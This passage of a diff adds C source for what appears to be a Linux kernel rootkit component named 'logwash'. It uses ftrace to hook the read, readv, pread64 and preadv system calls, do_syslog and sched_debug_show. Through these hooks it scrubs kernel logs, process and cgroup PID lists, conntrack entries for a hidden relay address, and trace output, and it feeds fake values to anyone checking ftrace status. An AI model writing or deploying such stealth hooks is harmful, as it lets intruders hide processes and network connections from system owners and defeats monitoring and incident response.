+            return ub_real_res;
+        return filter_proc_children_pids(user_buf, ub_real_res);
+    }
+
+    if (ub_veiled_count > 0 && is_procfs_file(file)) {
+        ub_real_res = ub_real_read(regs);
+        fput(file);
+        if (ub_real_res > 0)
+            return filter_proc_json_tasks(user_buf, ub_real_res);
+        return ub_real_res;
+    }
+
+    if (is_nf_conntrack_file(file)) {
+        ub_real_res = ub_real_read(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_conntrack_output(user_buf, ub_real_res);
+    }
+
+    if (is_trace_pipe_file(file)) {
+        ftrace_disabled = is_ftrace_fake_disabled();
+        
+        if (ftrace_disabled) {
+            fput(file);
+            do {
+                ub_real_res = ub_real_read(regs);
+                if (ub_real_res < 0) {
+                    return ub_real_res;
+                }
+                
+                if (ub_real_res == 0) {
+                    return 0;
+                }
+
+                if (signal_pending(current)) {
+                    return -EINTR;
+                }
+            } while (1);
+        }
+        
+        ub_real_res = ub_real_read(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_trace_pipe_output(user_buf, ub_real_res);
+    }
+
+    if (is_trace_file(file)) {
+        ftrace_disabled = is_ftrace_fake_disabled();
+        
+        if (ftrace_disabled && file->f_pos > 0) {
+            fput(file);
+            return 0;
+        }
+        
+        ub_real_res = ub_real_read(regs);
+        if (ub_real_res <= 0) {
+            fput(file);
+            return ub_real_res;
+        }
+        
+        res = filter_trace_output(user_buf, ub_real_res);
+        fput(file);
+        return res;
+    }
+
+    filename = NULL;
+    if (file->f_path.dentry)
+        filename = file->f_path.dentry->d_name.name;
+
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return ub_real_read(regs);
+    }
+
+    is_kmsg = is_kmsg_device(filename);
+
+    if (is_kmsg) {
+        do {
+            res = ub_real_read(regs);
+            if (res <= 0)
+                break;
+            res = filter_kmsg_line(user_buf, res);
+        } while (res == 0);
+        fput(file);
+        return res;
+    }
+
+    fput(file);
+    ub_real_res = ub_real_read(regs);
+    if (ub_real_res <= 0)
+        return ub_real_res;
+    return filter_buffer_content(user_buf, ub_real_res);
+}
+
+static notrace asmlinkage ssize_t ub_hook_read_ia32(const struct pt_regs *regs) {
+    struct file *file;
+    const char *filename;
+    bool is_kmsg, ftrace_disabled;
+    ssize_t res = 0, ub_real_res;
+    int fd;
+    char __user *user_buf;
+    size_t count;
+
+    if (!ub_real_read_ia32)
+        return -EINVAL;
+
+    fd = regs->bx;
+    user_buf = (char __user *)regs->cx;
+    count = (size_t)regs->dx;
+
+    if (!user_buf)
+        return -EFAULT;
+
+    if (ftrace_write_intercepted) {
+        struct file *check_file = fget(fd);
+        if (check_file) {
+            if (is_real_ftrace_enabled(check_file)) {
+                size_t fake_len = strlen(saved_ftrace_value);
+                unsigned long flags, now = jiffies;
+                bool should_return_data = false;
+                
+                spin_lock_irqsave(&ftrace_read_lock, flags);
+                if (time_after(now, last_ftrace_read_jiffies + msecs_to_jiffies(100))) {
+                    should_return_data = true;
+                    last_ftrace_read_jiffies = now;
+                }
+                spin_unlock_irqrestore(&ftrace_read_lock, flags);
+                
+                fput(check_file);
+                
+                if (!should_return_data)
+                    return 0;
+                
+                if (fake_len <= count) {
+                    if (!copy_to_user(user_buf, saved_ftrace_value, fake_len))
+                        return fake_len;
+                }
+                return -EFAULT;
+            }
+            fput(check_file);
+        }
+    }
+
+    file = fget(fd);
+    if (!file)
+        return ub_real_read_ia32(regs);
+
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
+            fput(file);
+            return 0;
+        }
+    }
+
+    if (is_cgroup_pid_file(file)) {
+        ub_real_res = ub_real_read_ia32(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_cgroup_pids(user_buf, ub_real_res);
+    }
+
+    if (is_proc_children_file(file)) {
+        ub_real_res = ub_real_read_ia32(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_proc_children_pids(user_buf, ub_real_res);
+    }
+
+    if (is_nf_conntrack_file(file)) {
+        ub_real_res = ub_real_read_ia32(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_conntrack_output(user_buf, ub_real_res);
+    }
+
+    if (is_trace_pipe_file(file)) {
+        ftrace_disabled = is_ftrace_fake_disabled();
+        
+        if (ftrace_disabled) {
+            fput(file);
+            do {
+                ub_real_res = ub_real_read_ia32(regs);
+                if (ub_real_res < 0) {
+                    return ub_real_res;
+                }
+                if (ub_real_res == 0) {
+                    return 0;
+                }
+                if (signal_pending(current)) {
+                    return -EINTR;
+                }
+            } while (1);
+        }
+        
+        ub_real_res = ub_real_read_ia32(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_trace_pipe_output(user_buf, ub_real_res);
+    }
+
+    if (is_trace_file(file)) {
+        ftrace_disabled = is_ftrace_fake_disabled();
+        if (ftrace_disabled && file->f_pos > 0) {
+            fput(file);
+            return 0;
+        }
+        ub_real_res = ub_real_read_ia32(regs);
+        if (ub_real_res <= 0) {
+            fput(file);
+            return ub_real_res;
+        }
+        res = filter_trace_output(user_buf, ub_real_res);
+        fput(file);
+        return res;
+    }
+
+    filename = NULL;
+    if (file->f_path.dentry)
+        filename = file->f_path.dentry->d_name.name;
+
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return ub_real_read_ia32(regs);
+    }
+
+    is_kmsg = is_kmsg_device(filename);
+
+    if (is_kmsg) {
+        do {
+            res = ub_real_read_ia32(regs);
+            if (res <= 0)
+                break;
+            res = filter_kmsg_line(user_buf, res);
+        } while (res == 0);
+        fput(file);
+        return res;
+    }
+
+    fput(file);
+    ub_real_res = ub_real_read_ia32(regs);
+    if (ub_real_res <= 0)
+        return ub_real_res;
+    return filter_buffer_content(user_buf, ub_real_res);
+}
+
+static notrace asmlinkage ssize_t ub_hook_pread64(const struct pt_regs *regs) {
+    struct file *file;
+    const char *filename;
+    bool is_kmsg;
+    ssize_t res, ub_real_res;
+    int fd = regs->di;
+    char __user *user_buf = (char __user *)regs->si;
+
+    if (!ub_real_pread64 || !user_buf)
+        return ub_real_pread64 ? ub_real_pread64(regs) : -EFAULT;
+
+    file = fget(fd);
+    if (!file)
+        return ub_real_pread64(regs);
+
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
+            fput(file);
+            return 0;
+        }
+    }
+
+    if (is_nf_conntrack_file(file)) {
+        ub_real_res = ub_real_pread64(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_conntrack_output(user_buf, ub_real_res);
+    }
+
+    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return ub_real_pread64(regs);
+    }
+
+    is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        do {
+            res = ub_real_pread64(regs);
+            if (res <= 0)
+                break;
+            res = filter_kmsg_line(user_buf, res);
+        } while (res == 0);
+        fput(file);
+        return res;
+    }
+
+    ub_real_res = ub_real_pread64(regs);
+    if (ub_real_res <= 0) {
+        fput(file);
+        return ub_real_res;
+    }
+    res = filter_buffer_content(user_buf, ub_real_res);
+    fput(file);
+    return res;
+}
+
+static notrace asmlinkage ssize_t ub_hook_pread64_ia32(const struct pt_regs *regs) {
+    struct file *file;
+    const char *filename;
+    bool is_kmsg;
+    ssize_t res, ub_real_res;
+    int fd = regs->bx;
+    char __user *user_buf = (char __user *)regs->cx;
+
+    if (!ub_real_pread64_ia32 || !user_buf)
+        return ub_real_pread64_ia32 ? ub_real_pread64_ia32(regs) : -EFAULT;
+
+    file = fget(fd);
+    if (!file)
+        return ub_real_pread64_ia32(regs);
+
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
+            fput(file);
+            return 0;
+        }
+    }
+
+    if (is_nf_conntrack_file(file)) {
+        ub_real_res = ub_real_pread64_ia32(regs);
+        fput(file);
+        if (ub_real_res <= 0)
+            return ub_real_res;
+        return filter_conntrack_output(user_buf, ub_real_res);
+    }
+
+    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return ub_real_pread64_ia32(regs);
+    }
+
+    is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        do {
+            res = ub_real_pread64_ia32(regs);
+            if (res <= 0)
+                break;
+            res = filter_kmsg_line(user_buf, res);
+        } while (res == 0);
+        fput(file);
+        return res;
+    }
+
+    ub_real_res = ub_real_pread64_ia32(regs);
+    if (ub_real_res <= 0) {
+        fput(file);
+        return ub_real_res;
+    }
+    res = filter_buffer_content(user_buf, ub_real_res);
+    fput(file);
+    return res;
+}
+
+static notrace asmlinkage ssize_t ub_hook_preadv(const struct pt_regs *regs) {
+    struct file *file;
+    const char *filename;
+    bool is_kmsg;
+    int fd = regs->di;
+    struct iovec __user *iov = (struct iovec __user *)regs->si;
+    ssize_t ub_real_res, filtered;
+
+    if (!ub_real_preadv || !iov)
+        return -EFAULT;
+
+    file = fget(fd);
+    if (!file)
+        return ub_real_preadv(regs);
+
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
+            fput(file);
+            return 0;
+        }
+    }
+
+    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return ub_real_preadv(regs);
+    }
+
+    ub_real_res = ub_real_preadv(regs);
+    if (ub_real_res <= 0) {
+        fput(file);
+        return ub_real_res;
+    }
+
+    is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return ub_real_res;
+        }
+        filtered = filter_kmsg_line(iov_copy.iov_base, ub_real_res);
+        fput(file);
+        return filtered;
+    }
+
+    {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return ub_real_res;
+        }
+        filtered = filter_buffer_content(iov_copy.iov_base, ub_real_res);
+        fput(file);
+        return filtered;
+    }
+}
+
+static notrace asmlinkage ssize_t ub_hook_preadv_ia32(const struct pt_regs *regs) {
+    struct file *file;
+    const char *filename;
+    bool is_kmsg;
+    int fd = regs->bx;
+    struct iovec __user *iov = (struct iovec __user *)regs->cx;
+    ssize_t ub_real_res, filtered;
+
+    if (!ub_real_preadv_ia32 || !iov)
+        return -EFAULT;
+
+    file = fget(fd);
+    if (!file)
+        return ub_real_preadv_ia32(regs);
+
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
+            fput(file);
+            return 0;
+        }
+    }
+
+    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return ub_real_preadv_ia32(regs);
+    }
+
+    ub_real_res = ub_real_preadv_ia32(regs);
+    if (ub_real_res <= 0) {
+        fput(file);
+        return ub_real_res;
+    }
+
+    is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return ub_real_res;
+        }
+        filtered = filter_kmsg_line(iov_copy.iov_base, ub_real_res);
+        fput(file);
+        return filtered;
+    }
+
+    {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return ub_real_res;
+        }
+        filtered = filter_buffer_content(iov_copy.iov_base, ub_real_res);
+        fput(file);
+        return filtered;
+    }
+}
+
+static notrace asmlinkage ssize_t ub_hook_readv(const struct pt_regs *regs) {
+    struct file *file;
+    const char *filename;
+    bool is_kmsg;
+    int fd = regs->di;
+    struct iovec __user *iov = (struct iovec __user *)regs->si;
+    ssize_t ub_real_res, filtered;
+
+    if (!ub_real_readv || !iov)
+        return -EFAULT;
+
+    file = fget(fd);
+    if (!file)
+        return ub_real_readv(regs);
+
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
+            fput(file);
+            return 0;
+        }
+    }
+
+    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return ub_real_readv(regs);
+    }
+
+    ub_real_res = ub_real_readv(regs);
+    if (ub_real_res <= 0) {
+        fput(file);
+        return ub_real_res;
+    }
+
+    is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return ub_real_res;
+        }
+        filtered = filter_kmsg_line(iov_copy.iov_base, ub_real_res);
+        fput(file);
+        return filtered;
+    }
+
+    {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return ub_real_res;
+        }
+        filtered = filter_buffer_content(iov_copy.iov_base, ub_real_res);
+        fput(file);
+        return filtered;
+    }
+}
+
+static notrace asmlinkage ssize_t ub_hook_readv_ia32(const struct pt_regs *regs) {
+    struct file *file;
+    const char *filename;
+    bool is_kmsg;
+    int fd = regs->bx;
+    struct iovec __user *iov = (struct iovec __user *)regs->cx;
+    ssize_t ub_real_res, filtered;
+
+    if (!ub_real_readv_ia32 || !iov)
+        return -EFAULT;
+
+    file = fget(fd);
+    if (!file)
+        return ub_real_readv_ia32(regs);
+
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
+            fput(file);
+            return 0;
+        }
+    }
+
+    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
+    if (!should_filter_file(filename)) {
+        fput(file);
+        return ub_real_readv_ia32(regs);
+    }
+
+    ub_real_res = ub_real_readv_ia32(regs);
+    if (ub_real_res <= 0) {
+        fput(file);
+        return ub_real_res;
+    }
+
+    is_kmsg = is_kmsg_device(filename);
+    if (is_kmsg) {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return ub_real_res;
+        }
+        filtered = filter_kmsg_line(iov_copy.iov_base, ub_real_res);
+        fput(file);
+        return filtered;
+    }
+
+    {
+        struct iovec iov_copy;
+        if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
+            fput(file);
+            return ub_real_res;
+        }
+        filtered = filter_buffer_content(iov_copy.iov_base, ub_real_res);
+        fput(file);
+        return filtered;
+    }
+}
+
+static notrace int ub_hook_sched_debug_show(struct seq_file *m, void *v) {
+    size_t buf_size = 8192;
+    char *buf, *line, *line_ptr;
+    struct seq_file tmp_seq;
+    int ret;
+
+    if (!ub_real_sched_debug_show || !m)
+        return -EINVAL;
+
+    buf = kzalloc(buf_size, GFP_KERNEL);
+    if (!buf)
+        return ub_real_sched_debug_show(m, v);
+
+    tmp_seq = *m;
+    tmp_seq.buf = buf;
+    tmp_seq.size = buf_size;
+    tmp_seq.count = 0;
+
+    ret = ub_real_sched_debug_show(&tmp_seq, v);
+
+    if (m->buf) {
+        line = buf;
+        while ((line_ptr = strchr(line, '\n'))) {
+            *line_ptr = '\0';
+            if (!line_contains_sensitive_info(line))
+                seq_printf(m, "%s\n", line);
+            line = line_ptr + 1;
+        }
+        if (*line && !line_contains_sensitive_info(line))
+            seq_printf(m, "%s", line);
+    }
+
+    kfree(buf);
+    return ret;
+}
+
+static notrace int ub_hook_do_syslog(int type, char __user *user_buf, int len, int source)
+{
+    int ret, ub_real_ret;
+    char *kernel_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0;
+    size_t alloc_size;
+
+    if (!ub_real_do_syslog)
+        return -EINVAL;
+
+    if (type != SYSLOG_ACTION_READ && type != SYSLOG_ACTION_READ_ALL && type != SYSLOG_ACTION_READ_CLEAR)
+        return ub_real_do_syslog(type, user_buf, len, source);
+
+    if (!user_buf || len <= 0)
+        return ub_real_do_syslog(type, user_buf, len, source);
+
+    ret = ub_real_do_syslog(type, user_buf, len, source);
+    ub_real_ret = ret;
+    
+    if (ret <= 0)
+        return ret;
+
+    alloc_size = ret;
+    if (alloc_size > MAX_CAP)
+        alloc_size = MAX_CAP;
+
+    kernel_buf = kvmalloc(alloc_size + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return ret;
+
+    if (copy_from_user(kernel_buf, user_buf, alloc_size)) {
+        kvfree(kernel_buf);
+        return ret;
+    }
+    kernel_buf[alloc_size] = '\0';
+
+    filtered_buf = kvzalloc(alloc_size + 1, GFP_KERNEL);
+    if (!filtered_buf) {
+        kvfree(kernel_buf);
+        return ret;
+    }
+
+    line_start = kernel_buf;
+    while ((line_end = strchr(line_start, '\n'))) {
+        size_t line_len = line_end - line_start;
+        char saved = *line_end;
+        *line_end = '\0';
+
+        if (!line_contains_sensitive_info(line_start)) {
+            if (filtered_len + line_len + 1 <= alloc_size) {
+                memcpy(filtered_buf + filtered_len, line_start, line_len);
+                filtered_len += line_len;
+                filtered_buf[filtered_len++] = '\n';
+            }
+        }
+
+        *line_end = saved;
+        line_start = line_end + 1;
+    }
+
+    if (*line_start && !line_contains_sensitive_info(line_start)) {
+        size_t remaining = strlen(line_start);
+        if (filtered_len + remaining <= alloc_size) {
+            memcpy(filtered_buf + filtered_len, line_start, remaining);
+            filtered_len += remaining;
+        }
+    }
+
+    if (filtered_len == 0) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        if (clear_user(user_buf, ub_real_ret)) {
+            return -EFAULT;
+        }
+        return 0;
+    }
+
+    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return -EFAULT;
+    }
+    
+    if (filtered_len < ub_real_ret) {
+        if (clear_user(user_buf + filtered_len, ub_real_ret - filtered_len)) {
+            kvfree(kernel_buf);
+            kvfree(filtered_buf);
+            return -EFAULT;
+        }
+    }
+
+    kvfree(kernel_buf);
+    kvfree(filtered_buf);
+    return (int)filtered_len;
+}
+
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_read", ub_hook_read, &ub_real_read),
+    HOOK("__ia32_sys_read", ub_hook_read_ia32, &ub_real_read_ia32),
+    HOOK("__x64_sys_pread64", ub_hook_pread64, &ub_real_pread64),
+    HOOK("__ia32_sys_pread64", ub_hook_pread64_ia32, &ub_real_pread64_ia32),
+    HOOK("__x64_sys_readv", ub_hook_readv, &ub_real_readv),
+    HOOK("__ia32_sys_readv", ub_hook_readv_ia32, &ub_real_readv_ia32),
+    HOOK("__x64_sys_preadv", ub_hook_preadv, &ub_real_preadv),
+    HOOK("__ia32_sys_preadv", ub_hook_preadv_ia32, &ub_real_preadv_ia32),
+    HOOK("do_syslog", ub_hook_do_syslog, &ub_real_do_syslog),
+    HOOK("sched_debug_show", ub_hook_sched_debug_show, &ub_real_sched_debug_show),
+};
+
+notrace int ub_logwash_start(void) {
+    hidden_conntrack_ip = in_aton(UB_RELAY_ADDR);
+    return ub_fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+}
+
+notrace void ub_logwash_stop(void) {
+    ub_fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+}
